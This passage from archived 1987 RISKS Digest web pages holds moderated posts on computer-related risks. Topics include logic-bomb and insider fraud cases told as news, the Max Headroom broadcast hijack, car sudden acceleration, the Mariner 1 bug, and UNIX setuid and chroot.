For more information contact Frank Houston (houston@nrl-csr.arpa).
Be sure to include your mailing address.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
"Normal Accidents" revisited
</A>
</H3>
<address>
David Chase 
&lt;<A HREF="mailto:acornrc!rbbb@ames.arpa">
acornrc!rbbb@ames.arpa
</A>&gt;
</address>
<i>
Thu, 19 Nov 87 8:37 PST
</i><PRE>

I just finished "Normal Accidents" by Charles Perrow (Basic Books, 198?).  I
recommend it for your class and I recommend it for RISKS aficionados.
Perrow's thesis is that "complex, tightly-coupled systems" will have
accidents; the accidents are "normal".  He also writes about risk-inducing
organizations and the way that they "analyze" accidents ("blame the operator"
is a common theme--certainly it has low short-term cost, and avoids the
inference that (say) nuclear power is intrinsically disaster-prone).

He says little about computers in this book.  However, he provides enough
examples of unexpected interactions and multiple errors to make most people
hesitant about claiming to "cover all the bases" (e.g., I did not know that
dams could cause the earth beneath them to shift, though it makes perfect
sense in hindsight).

David Chase, Olivetti Research Center, Menlo Park

    [This book is one of the cornerstones of RISKS, and is worth noting
    here again every now and then, particularly for new readers.  PGN]

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Space Shuttle Whistle-Blowers Sound Alarm Again (reprint) 
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 19 Nov 87 18:16:45 -0500
From: rdicamil@CC5.BBN.COM

         Space Shuttle Whistle-Blowers Sound Alarm Again
             (Electronic Engineering Times, 11/16/87)
  
                       by Richard Doherty
  
  HOUSTON - The first step in a concerted action by so-called technology
  whistle-blowers to increase public awareness of continuing problems with the
  NASA shuttle will be made here this week.
  
  On Wednesday, former Lockheed company engineer John Maxson is due to address
  an ethics meeting of the American Society of Mechanical Engineers about the
  wider aspects of whistle-blowing.  During his presentation, Maxson is
  expected to give evidence collected over the past few months that he will
  claim supports fears that critical shuttle sub-system problems still remain.
  
  Maxson will share the stage with former Morton Thiokol engineer Roger
  Boisjoly, who currently has a billion-dollar suit underway against his
  one-time employer and NASA. Boisjoy has charged that Morton Thiokol
  conspired to cover up problems with the shuttle's solid rocket motors, the
  failure of which was blamed for the Challenger tragedy last year.  He also
  claims he suffered personal injury as a result of the disaster.
  
  Boisjoly was one of several Morton Thiokol engineers who objected to the
  launch of the Challenger before its ill-fated liftoff.
  
  Maxson was dismissed by Lockheed's Space Operations Co. some months after
  the shuttle was destroyed. Six weeks before the shuttle explosion, in
  December 1985, Maxson had tried to convince Senator Charles Grassley
  (R-Iowa), a supporter of such whistle-blowing, that problems with the
  shuttle launch system should preclude the launch of the shuttle Columbia.
  
  Columbia, which lifted off successfully after a near-disastrous mistake in
  fueling liquid oxygen tanks, was the last successful shuttle launch.
  
  Maxson has sued Lockheed for wrongful dismissal, and claims he is one of
  hundreds of NASA and contractor employees who were forced out "for doing our
  jobs".
  
  In coming months, as more evidence surfaces, Maxson aims to rally support
  among other unemployed engineers.  He hopes to help restore their jobs and
  also raise industry awareness of shuttle subsystem problems and managerial
  laissez-faire attitudes that he claim threaten a scheduled safe return to
  space June 2.

My addendum comment:  As a usual watcher of CNN "headline news" I've noticed
lately some press about another "new shuttle escape system".  This one is
some kind of rocket designed to pull (a parachuted equipped) astronaut out
of the ship by a harness.  I did notice that CNN mentioned in their
commentary that this kind of escape system would not have saved the
astronauts in the Challenger disaster.  However, I have failed to hear such
commentary included in similar stories of the major networks.

Too, this is one recent story in a seemingly continual series of press
releases about the new and improved shuttle escape mechanisms. Lot's of
money is being spent, but whether reported or not, upon (close) examination
none of these mechanisms would prevent the death of astronauts in a
Challenger type disaster.

I wonder just how much additional engineering is happening for purely public
relations purposes (and at what, if any risk) ?  Perhaps this is just
another clever manifestation of the "laissez-faire" attitude Mr. Maxson is
trying to expose. It's unfortunate that such P/R, spaced even over many
months, could lull the public into a false sense of security. Also, such
news less any critical commentary - does sell quite well ( news reporting is
also a commodity).
  
</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.61.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.63.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-15</DOCNO>
<DOCOLDNO>IA012-000130-B022-157</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.63.html 128.240.150.127 19970217014240 text/html 23319
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:41:08 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 63</TITLE>
<LINK REL="Prev" HREF="/Risks/5.62.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.64.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.62.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.64.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 63</H1>
<H2>Monday, 23 November 1987</H2>
<H3>Forum on Risks to the Public in Computers and Related Systems</H3>
<I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy,
<A HREF="http://www.csl.sri.com/neumann/neumann.html">Peter G.
Neumann</A>, moderator</I><P>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj1">Logic bombs and other system attacks -- in Canada</A></DT>
<DD><A HREF="#subj1.1">PGN</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj2">Video signal piracy hits WGN/WTTW</A></DT>
<DD><A HREF="#subj2.1">Rich Kulawiec</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj3">Garage Door Openers</A></DT>
<DD><A HREF="#subj3.1">Brint Cooper</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj4">Sudden acceleration revisited</A></DT>
<DD><A HREF="#subj4.1">Nancy Leveson</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj5">Centralized Auto Locking</A></DT>
<DD><A HREF="#subj5.1">Lindsay F. Marshall</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj6">Re: The Stark incident</A></DT>
<DD><A HREF="#subj6.1">Amos Shapir</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj7">Bank Networks</A></DT>
<DD><A HREF="#subj7.1">George Bray</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj8">Re: Optimizing for cost savings, not safety</A></DT>
<DD><A HREF="#subj8.1">Dave Horsfall</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj9">L.A. Earthquake &amp; Telephone Service</A></DT>
<DD><A HREF="#subj9.1">LT Scott A. Norton</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj10">Gripen flight delayed</A></DT>
<DD><A HREF="#subj10.1">Henry Spencer</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj11">Mariner 1</A></DT>
<DD><A HREF="#subj11.1">Mark Brader</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj12">Systemantics</A></DT>
<DD><A HREF="#subj12.1">John Gilmore</A><BR>
<A HREF="#subj12.2">haynes</A><BR>
</DD><DT><IMG SRC="/Images/redball.gif" ALT="o" WIDTH="14" HEIGHT="14">
<A HREF="#subj13">Re: "UNIX setuid stupidity"</A></DT>
<DD><A HREF="#subj13.1">Joseph G. Keane</A><BR>
<A HREF="#subj13.2">Martin Minow</A><BR>
</DD></DL>
<A NAME="subj1"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">Logic bombs and other system attacks -- in Canada</A></H3>
<ADDRESS>
Peter G. Neumann
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">Neumann@KL.SRI.COM</A>&gt;
</ADDRESS>
<I>Mon 23 Nov 87 13:27:25-PST</I><PRE>
To: <A HREF="mailto:RISKS@KL.SRI.COM">RISKS@KL.SRI.COM</A>

An article by Kirk Makin in the Globe and Mail, 3 November 1987, describe a
talk given by Sergeant Ted Green of the Ontario Provincial Police at the
recent annual conference of the Probation Officers Association of Ontario.

* A disgruntled employee of a London, Ontario, company planted a logic
bomb that would have knocked out the computer system.  It was detected.
The man was prosecuted, but not convicted.  Evidence of a previous
logic bomb implantation was not admitted because the previous company
(in Alberta) had refused to press charges.

* Another Toronto company had a logic bomb triggered the day an employee's
termination notice was processed by the computer system.  Sgt Green
noted that "It wiped out the whole system."

* On the occasion of its 10th anniversary, a bank branch decided to
honor the customer who had the most active account.  It turned out to
be an employee who had accumulated $70,000 funnelling a few cents out
of every account into his own.

* On employee altered an access password and demanded $50,000 to reveal
the new password.  Apparently he got it.

* One Toronto student recently made 2177 attempts to enter the computer
system of Alcan Aluminium's Kingston, Ont., plant.

Sgt. Green also noted $1000 in computer-initiated bogus charges, a[nother]
bogus bank deposit slip scam attempt, and a case of a Toronto-area machinery
supplier using mailing lists and blueprints extracted from a rival's computer.

</PRE>
<A NAME="subj2"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1"></A></H3>
<ADDRESS>
Rich Kulawiec
&lt;<A HREF="mailto:rsk@s.cc.purdue.edu">rsk@s.cc.purdue.edu</A>&gt;
</ADDRESS>
<I>Mon, 23 Nov 87 17:20:56 EST</I><PRE>
Subject: Video signal piracy hits WGN/WTTW

At about 9:15 CST last night (Sunday, November 22, 1987), "superstation"
WGN-TV (Channel 9 in Chicago) was the victim of an interesting technological
crime; its signal was overridden for approximately 15 seconds by a pirate
transmission.  The incident was repeated at about 11:15 CST, with WTTW
(Channel 11, the Chicago PBS station) falling prey on the second occasion,
which lasted about 90 seconds.

The transmission, which interrupted a newscast on WGN and "Dr. Who" on
WTTW, consisted primarily of someone in a Max Headroom mask throwing
Pepsi and Coke cans around while raving in a largely unintelligible
voice.  The transmission concluded (I'm not kidding) with a shot of the
Max-impersonator's exposed derriere' being whacked with a flyswatter.
The video quality of the transmision was fairly good, but the audio was
very garbled.  I happened to be taping Dr. Who at the time, and so I've
watched the broadcast several times; even so, I can't understand more
than a word or two.

A couple of phone calls (to the local cable TV company, and to WTTW)
led to a little more information; it is likely that the pirate
transmission was inserted somewhere in the Chicago area, as it was
distributed over WGN's satellite link and WTTW's (land-based) microwave
links.  If my information is correct, WGN has the capability of
switching to a second frequency for the uplink portion of its broadcast
chain, but it's not clear whether they actually did so during or after
the incident.  WTTW does not have this capability, and the person I
talked to on the phone sounded (understandably) a little worried that
this might happen again.

As one might expect, the FCC and the FBI, among other agencies, are
investigating.  It seems likely to me that the culprit found a point through
which WGN's and WTTW's signals both pass, and tapped in at that point; while
this certainly isn't the only way that this piracy could be accomplished, it
seems the easiest.
Rich Kulawiec, <A HREF="mailto:rsk@s.cc.purdue.edu">rsk@s.cc.purdue.edu</A>, s.cc.purdue.edu!rsk

[This is becoming almost too frequent, but still worth noting.  PGN]

</PRE>
<A NAME="subj3"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1"></A></H3>
<ADDRESS>
Brint Cooper
&lt;<A HREF="mailto:abc@BRL.ARPA">abc@BRL.ARPA</A>&gt;
</ADDRESS>
<I>Thu, 19 Nov 87 11:40:39 EST</I><PRE>
Subject:  Garage Door Openers

This morning's Baltimore Sun tells of folks in Frederick, MD,
who are having great difficulty with their remotely controlled garage
door openers.  It seems that, installed in their houses, these things
have just stopped responding to commands from the hand held unit.
However, when taken back to the point of purchase, they work just fine.

The U.S. Army has an installation, Ft Detrick (sp?) nearby.  One
of its two functions has something to do with electronic communications.
An Army spokesperson denies that the Army is radiating anything that
would lock up these receivers.
_Brint

</PRE>
<A NAME="subj4"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">Sudden acceleration revisited</A></H3>
<ADDRESS>
&lt;&gt;
</ADDRESS>
<I>Mon, 23 Nov 87 08:50:21 -0800</I><PRE>
From: Nancy Leveson &lt;<A HREF="mailto:nancy@commerce.UCI.EDU">nancy@commerce.UCI.EDU</A>&gt;

There was just a report on the NBC news (Sunday, Nov. 21 at 4:30 pm PST)
on the sudden acceleration problems with the Acura Legend.  The Acura
dealers say it is driver error.  The drivers all say they have been
driving for 30-40 years without an accident or a ticket and they insist
they had at least one foot on the brake (one woman said she had both feet
on the brake).  A mechanic who has been examining one of the cars involved
says it is obviously a problem in the fuel injection system, and he is
sure that the computer is involved.

Does anyone know if there is any connection between the microprocessor
used in the Acura and in the other cars with this problem, e.g., the
Audi 5000?

</PRE>
<A NAME="subj5"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">Centralized Auto Locking</A></H3>
<ADDRESS>
"Lindsay F. Marshall"
&lt;<A HREF="mailto:lindsay%kelpie.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">lindsay%kelpie.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK</A>&gt;
</ADDRESS>
<I></I><PRE>
Date: Mon, 23 Nov 87 11:19:20 GMT

My father spotted a report in a paper about someone who was trapped in a car
when the central locking mechanism went haywire. The person in question was
too large to escape by climbing through the window, which was how some of the
other passengers got out. Sadly I have no more details about this as my
father couldn't remember where he had seen it - it sounds like a FOAF story
("friend of a friend" story - urban legend, if you're a sociologist), but I'd
be interested if anyone else has heard it.
Lindsay

</PRE>
<A NAME="subj6"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">Re: The Stark incident (RISKS DIGEST 5.62)</A></H3>
<ADDRESS>
Amos Shapir
&lt;<A HREF="mailto:nsc!taux01!taux01.UUCP!amos@Sun.COM">nsc!taux01!taux01.UUCP!amos@Sun.COM</A>&gt;
</ADDRESS>
<I></I><PRE>
Date: 22 Nov 87 09:38:59 GMT
Organization: National Semiconductor (Israel) Ltd. Home of the 32532

It looks like the culprit in this case was whoever decided to classify
incoming missiles into 'hostile' and 'friendly' categories - did they
think that a friendly missile fired by mistake should behave any friendlier
than a hostile one?

Amos Shapir			(My other cpu is a NS32532)
National Semiconductor (Israel)
6 Maskit st. P.O.B. 3007, Herzlia 46104, Israel  Tel. +972 52 522261
<A HREF="mailto:amos%taux01@nsc.com">amos%taux01@nsc.com</A> (used to be <A HREF="mailto:amos%nsta@nsc.com">amos%nsta@nsc.com</A>) 34 48 E / 32 10 N

</PRE>
<A NAME="subj7"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1"></A></H3>
<ADDRESS>
George Bray
&lt;<A HREF="mailto:lcc.ghb@SEAS.UCLA.EDU">lcc.ghb@SEAS.UCLA.EDU</A>&gt;
</ADDRESS>
<I>Fri, 20 Nov 87 13:02:58 PST</I><PRE>
Subject:    Bank Networks (Re: <A HREF="/Risks/5.61.html">RISKS-5.61</A>)

I have two comments on the article in RISKS 4.61 by David G. Grubbs:

&gt;(VISA card numbers all start with 4, Master Card with 5, AMEX with 37, etc.)

Actually, AMEX cards can begin with 34, 35, or 37.  (Nit-picky, I know.)

&gt; Our money is managed by people who care nothing for the details of
&gt; an single transaction.  They sell financial services like the grocer
&gt; sells apples.  So what if a few are dropped on the floor?  It's just a
&gt; "cost of doing business."  As the throughput of transactions increases over
&gt; time, each detail gets commensurately smaller.  It can only get worse.

That is quite true.  In my days working for a bank (which actually was
better than most about it) I was often astounded at the cavalier attitude
towards a single transaction.  Of course, from the point of view of the
bank, fixing a major problem in the middle of the day (one that was costing
thousands of dollars an hour) is clearly vital, but I couldn't help worrying
about the poor customer who happened to go up to an ATM during the 10 minutes
the front-end processor was being downloaded, or during any other downtime
in the middle of the day.  From the bank's point of view, a few transactions
lost out of half a million or more a day is minor.  From the customer's
point of view (who is late for a flight and needs cash), that one transaction
is critical.
George Bray

</PRE>
<A NAME="subj8"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1"></A></H3>
<ADDRESS>
Dave Horsfall
&lt;<A HREF="mailto:munnari!runx.ips.oz.au!dave@uunet.UU.NET">munnari!runx.ips.oz.au!dave@uunet.UU.NET</A>&gt;
</ADDRESS>
<I>Sat, 21 Nov 87 01:33:04 AESST</I><PRE>
Subject: Re: Optimizing for cost savings, not safety (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)

&gt; Re: Optimizing for cost savings, not safety (John McLeod)
&gt;From: <A HREF="mailto:bill@trotter.usma.edu">bill@trotter.usma.edu</A> (Bill Gunshannon)
&gt;   A letter was published in an amateur radio oriented magazine called QST
&gt;a few years back by a ham who tried to install a UHF mobile radio in his
&gt;newly purchased Japanese import.  He too had problems with interference to
&gt;the electronic ignition in the car.  A call to the US Service Representative
&gt;for the cars manufacturer resulted in a very simple solution to the problem.
&gt;They told him "don't install the radio in the car".
&gt;
&gt;  A novel approach to preventing interference.
&gt;                                                     bill gunshannon

Another "informed" reply that appeared in an amateur radio magazine was:
"Try shielding the antenna".  And these people design cars?
-- Dave

</PRE>
<A NAME="subj9"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">L.A. Earthquake &amp; Telephone Service</A></H3>
<ADDRESS>
"LT Scott A. Norton, USN"
&lt;<A HREF="mailto:4526P%NAVPGS.BITNET@wiscvm.wisc.edu">4526P%NAVPGS.BITNET@wiscvm.wisc.edu</A>&gt;
</ADDRESS>
<I>Fri, 20 Nov 87 15:17:09 PST</I><PRE>
To: Risks Forum &lt;<A HREF="mailto:Risks@csl.sri.com">Risks@csl.sri.com</A>&gt;

The December 87 issue of The Institute: News Supplement to IEEE Spectrum has
a short but interesting article on the effect of Oct 1st's Los Angeles
earthquake on the utilities.  Most of the article deals with electric power,
which had the most problems ( but still minor ).  But a few paragraphs on
the telephone service should be of interest to RISKS readers.

The article points out that telephone network was largely undamaged by
the quake because many lines have recently been replace by fiber optic
cables that were installed with a large amount of slack, which permitted
them to move without breaking during the quake.

As we already know, many subscribers were unable to get dial tones
after the quake.  I thought "Lots of people calling relatives tied it
up", which was a factor, but The Institute reports that most of the
delays resulted because the quake knocked phone receivers off the hook.
Of course, anxious and curious callers also tied up the lines, and
two central offices lost power intermittently.

Can anyone with better knowledge of the phone companies' local offices tell
me if there is some simple way to shed this extra load in a reasonable way?
I know that after some minutes off the hook, the phone loses its dial tone.
Does this adequately release the resources the off-the-hook phone was using?

LT Scott A. Norton, USN     | From Internet, if you need a gateway, use
Naval Postgraduate School   |    <A HREF="mailto:4526p%navpgs.bitnet@jade.berkeley.edu">4526p%navpgs.bitnet@jade.berkeley.edu</A>
Monterey, CA 93943-5018     | or <A HREF="mailto:4526p%navpgs.bitnet@ucscc.ucsc.edu">4526p%navpgs.bitnet@ucscc.ucsc.edu</A>
<A HREF="mailto:4526P@NavPGS.BITNET">4526P@NavPGS.BITNET</A>         | The WISCVM gateway will close 15 Dec 87. )

</PRE>
<A NAME="subj10"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1"></A></H3>
<ADDRESS>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">mnetor!utzoo!henry@uunet.UU.NET</A>&gt;
</ADDRESS>
<I>Tue, 17 Nov 87 21:04:31 EST</I><PRE>
Subject: Gripen flight delayed

The Oct 5th Aviation Week reports that first flight of Sweden's new Gripen
fly-by-wire combat aircraft will slip about eight months due to software
development delays.  This is on top of a previous six-month slip for the
same reason.  This is the last slip that can be absorbed without delaying
the operational service date (1992).  No real details were provided; on the
surface it would appear that things are going well but unexpectedly slowly,
and prime contractor Saab-Scania is just being cautious.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

[Yes, this is a risk commonly attributed to computers, but it is
hardly novel.  It is included to remind us of the dependence on
the software development process...  PGN]

</PRE>
<A NAME="subj11"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1"></A></H3>
<ADDRESS>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com">msb@sq.com</A>&gt;
</ADDRESS>
<I>Sun, 22 Nov 87 12:34:05 EST</I><PRE>
Subject: Mariner 1
Cc: <A HREF="mailto:utzoo!henry@uunet.UU.NET">utzoo!henry@uunet.UU.NET</A>

*   A rocket on the way to Mars has to be destroyed because a crucial
line is left out of the computer software controlling it.

Presumably the above refers to Mariner 1.  This is about the fourth or
so version that I've heard of what the actual error was.  Arthur C. Clarke
says it was a missing "-".  Others say that a "." was typed in place of a
"," in a Fortran DO statement (thus turning it into an assignment).

Peter, do you know of a reference that tells authoritatively what the actual
bug was?  Normally I'd consider ACC authoritative, but the version he tells
doesn't seem to appear anywhere else, so maybe not this time.

I posted the same question to sci.space a year or two ago and got no takers.

Mark Brader, Toronto, utzoo!sq!msb, <A HREF="mailto:msb@sq.com">msb@sq.com</A>

[We've tried this one before, but perhaps someone new has joined us.  PGN]

</PRE>
<A NAME="subj12"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1"></A></H3>
<ADDRESS>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu">hoptoad.UUCP!gnu@cgl.ucsf.edu</A>&gt;
</ADDRESS>
<I>Sat, 21 Nov 87 06:32:18 PST</I><PRE>
Subject: Systemantics

David Chase's recommendaion of "Normal Accidents" reminded me of the
book "Systemantics" which I read years ago and can no longer remember
the vitals of.  Its premise, well explored and humorously explained, is
that sufficiently complex systems always have unexpected behaviours.

I suspect it's another RISKS cornerstone.
John Gilmore

["Systemantics" by John Gall.   Although humorous, in the spirit
of Parkinson's Law, it has some great truths, such as

"Fail-safe systems fail by failing to fail safe."

<A HREF="mailto:haynes@ucscc.bitnet">haynes@ucscc.bitnet</A>, ...ucbvax!ucscc!haynes]

[Legendary!  Previously noted in RISKS by
Jim Horning, RISKS-1.2;
Earl Boebert, <A HREF="/Risks/2.16.html">RISKS-2.16</A>;
Hal Murray, <A HREF="/Risks/2.18.html">RISKS-2.18</A>.
Consult your local Books-in-Print.  PGN]

</PRE>
<HR><H3><A NAME="subj12.2"></A></H3>
<ADDRESS>
"Joseph G. Keane"
&lt;jk3k+@andrew.cmu.edu&gt;
</ADDRESS>
<I>Sat, 21 Nov 87 10:51:03 -0500 (EST)</I><PRE>
Subject: Re: "UNIX setuid stupidity" (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)

The designers of UNIX considered that a trusted program may wish to allow
operations only on a certain part of the directory tree.  So they provided the
`chroot' system call, which allows a program to do just that, in a secure way.
I was surprised as i saw the argument go by with no one mentioning this, but
maybe i shouldn't have been.  I guess the moral is that a feature doesn't do
you any good if no one knows about it.

--Joe

</PRE>
<A NAME="subj13"><IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj13.1"></A></H3>
<ADDRESS>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com">minow%thundr.DEC@decwrl.dec.com</A>&gt;
</ADDRESS>
<I>23 Nov 87 09:02</I><PRE>
To: <A HREF="mailto:risks@csl.sri.com">risks@csl.sri.com</A>
Subject: further comment on setuid problem

From Risks 5.62:
&gt;From: <A HREF="mailto:munnari!basser.cs.su.oz.au!steve@uunet.UU.NET">munnari!basser.cs.su.oz.au!steve@uunet.UU.NET</A> (Stephen Russell)
...
&gt;This raises the interesting question of who is responsible for this security
&gt;bug - the person who wrote the buggy program, or the programmer who
&gt;installed it without vetting it?

Perhaps one might add to this list the people who designed an error-prone
capability, or the people who failed to document the way in which a
security-enhancing function can -- though used with good intent -- serve
to decrease the security of the system.
Martin.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.62.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.64.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-16</DOCNO>
<DOCOLDNO>IA012-000130-B022-177</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.64.html 128.240.150.127 19970217014255 text/html 22548
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:41:21 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 64</TITLE>
<LINK REL="Prev" HREF="/Risks/5.63.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.65.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.63.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.65.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 64</H1>
<H2> Tuesday, 24 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
More on NASA Hackers 
</A>
<DD>
